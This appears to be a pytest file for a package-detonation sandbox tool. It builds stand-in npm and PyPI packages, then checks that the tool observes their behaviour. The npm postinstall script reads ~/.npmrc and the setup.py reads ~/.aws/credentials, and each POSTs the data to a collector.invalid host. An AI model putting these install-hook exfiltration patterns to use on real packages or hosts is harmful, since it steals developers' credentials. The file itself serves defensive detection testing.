"""Detonation in real containers, with harmless stand-in packages.

Runs only where BOMBSQUAD_DETONATE=1 is set, on Linux with Docker: the `detonate` job in
ci.yml. The stand-ins read a fake credential and send it to a name under `.invalid`, which
only the sink answers; outside the sandbox nothing would resolve or receive it.
"""

from __future__ import annotations

import io
import json
import os
import shutil
import sys
import tarfile
from pathlib import Path

import pytest

from bombsquad.cli import EXIT_OK, main

pytestmark = pytest.mark.skipif(
    os.environ.get("BOMBSQUAD_DETONATE") != "1" or not sys.platform.startswith("linux")
    or shutil.which("docker") is None,
    reason="needs BOMBSQUAD_DETONATE=1, Linux and Docker")


def _tarball(path: Path, files: dict[str, str]) -> Path:
    out = io.BytesIO()
    with tarfile.open(fileobj=out, mode="w:gz") as tar:
        for name, text in files.items():
            data = text.encode()
            info = tarfile.TarInfo(name)
            info.size = len(data)
            info.mode = 0o644
            tar.addfile(info, io.BytesIO(data))
    path.write_bytes(out.getvalue())
    return path


def _detonate(spec: str, artifact: Path, out: Path) -> dict:
    assert main(["detonate", spec, "--artifact", str(artifact), "--timeout", "180",
                 "--format", "json", "-o", str(out)]) == EXIT_OK
    report = json.loads(out.read_text(encoding="utf-8"))
    print(json.dumps(report, indent=2))  # kept in the CI log; the stand-ins hold no secrets
    return report


def test_npm_install_script_that_reads_and_sends_npmrc(tmp_path):
    collect = (
        "const fs = require('fs'), os = require('os'), http = require('http');\n"
        "const cp = require('child_process');\n"
        "const token = fs.readFileSync(os.homedir() + '/.npmrc', 'utf8');\n"
        "cp.execFileSync('id');\n"
        "const req = http.request({hostname: 'collector.invalid', path: '/c', method: 'POST',\n"
        "  headers: {'Content-Length': Buffer.byteLength(token)}}, () => {});\n"
        "req.on('error', () => {});\n"
        "req.end(token);\n"
    )
    artifact = _tarball(tmp_path / "detonate-standin-1.0.0.tgz", {
        "package/package.json": json.dumps({"name": "detonate-standin", "version": "1.0.0",
                                            "scripts": {"postinstall": "node collect.js"}}),
        "package/collect.js": collect,
    })
    report = _detonate("npm:detonate-standin@1.0.0", artifact, tmp_path / "npm.json")
    observed = report["observed"]
    assert observed["hook_commands"] == ["node collect.js"]
    assert {r["file"] for r in observed["credentials_read"] if r["package_code"]} == {
        "~/.npmrc"}
    assert {r["secret"] for r in observed["credentials_sent"]} == {"npm token"}
    assert "collector.invalid" in observed["dns_names"]
    assert any(r["command"].startswith("id") for r in observed["programs_started"])
    assert {"network", "credentials read", "credentials sent"} <= set(
        report["comparison"]["confirmed"])


def test_pypi_setup_py_and_import_are_both_observed(tmp_path):
    setup = (
        "import os, urllib.request\n"
        "from setuptools import setup\n"
        "data = open(os.path.expanduser('~/.aws/credentials'), 'rb').read()\n"
        "try:\n"
        "    urllib.request.urlopen('http://collector.invalid:8080/u', data, timeout=5)\n"
        "except Exception:\n"
        "    pass\n"
        "setup(name='detonate-standin', version='1.0', packages=['detonate_standin'])\n"
    )
    module = (
        "import socket\n"
        "try:\n"
        "    socket.gethostbyname('imported.invalid')\n"
        "except OSError:\n"
        "    pass\n"
    )
    artifact = _tarball(tmp_path / "detonate-standin-1.0.tar.gz", {
        "detonate-standin-1.0/PKG-INFO": "Metadata-Version: 2.1\nName: detonate-standin\n"
                                         "Version: 1.0\n",
        "detonate-standin-1.0/setup.py": setup,
        "detonate-standin-1.0/detonate_standin/__init__.py": module,
    })
    report = _detonate("pypi:detonate-standin@1.0", artifact, tmp_path / "pypi.json")
    observed = report["observed"]
    hooks = observed["hook_commands"]
    assert any(h.startswith("setup.py") for h in hooks)  # pip runs it, once per step
    assert any("/opt/detonate/import.py" in h for h in hooks)
    assert "~/.aws/credentials" in {r["file"] for r in observed["credentials_read"]}
    assert {r["secret"] for r in observed["credentials_sent"]} >= {"AWS access key",
                                                                   "AWS secret key"}
    assert {"collector.invalid", "imported.invalid"} <= set(observed["dns_names"])
    assert observed["exit_status"] == 0


def _wheel(path: Path, files: dict[str, str], dist_info: str) -> Path:
    import base64
    import hashlib
    import zipfile

    record = []
    for name, text in files.items():
        digest = base64.urlsafe_b64encode(hashlib.sha256(text.encode()).digest()).rstrip(b"=")
        record.append(f"{name},sha256={digest.decode()},{len(text.encode())}")
    record.append(f"{dist_info}/RECORD,,")
    with zipfile.ZipFile(path, "w") as archive:
        for name, text in files.items():
            archive.writestr(name, text)
        archive.writestr(f"{dist_info}/RECORD", "\n".join(record) + "\n")
    return path


def test_pypi_wheel_is_installed_when_the_sdist_does_not_build(tmp_path):
    sdist = _tarball(tmp_path / "detonate-fallback-1.0.tar.gz", {
        "detonate-fallback-1.0/PKG-INFO": "Metadata-Version: 2.1\nName: detonate-fallback\n"
                                          "Version: 1.0\n",
        "detonate-fallback-1.0/setup.py": "raise SystemExit('needs a compiler it lacks')\n",
    })
    dist_info = "detonate_fallback-1.0.dist-info"
    wheel = _wheel(tmp_path / "detonate_fallback-1.0-py3-none-any.whl", {
        "detonate_fallback/__init__.py": (
            "import socket\n"
            "try:\n"
            "    socket.gethostbyname('wheel-imported.invalid')\n"
            "except OSError:\n"
            "    pass\n"),
        f"{dist_info}/METADATA": "Metadata-Version: 2.1\nName: detonate-fallback\n"
                                 "Version: 1.0\n",
        f"{dist_info}/WHEEL": "Wheel-Version: 1.0\nGenerator: test\nRoot-Is-Purelib: true\n"
                              "Tag: py3-none-any\n",
        f"{dist_info}/top_level.txt": "detonate_fallback\n",
    }, dist_info)
    out = tmp_path / "fallback.json"
    assert main(["detonate", "pypi:detonate-fallback@1.0", "--artifact", str(sdist),
                 "--wheel", str(wheel), "--timeout", "180", "--format", "json",
                 "-o", str(out)]) == EXIT_OK
    report = json.loads(out.read_text(encoding="utf-8"))
    print(json.dumps(report, indent=2))
    assert any("was installed and imported" in n for n in report["notes"])
    assert "wheel-imported.invalid" in report["observed"]["dns_names"]
    assert report["observed"]["exit_status"] == 0
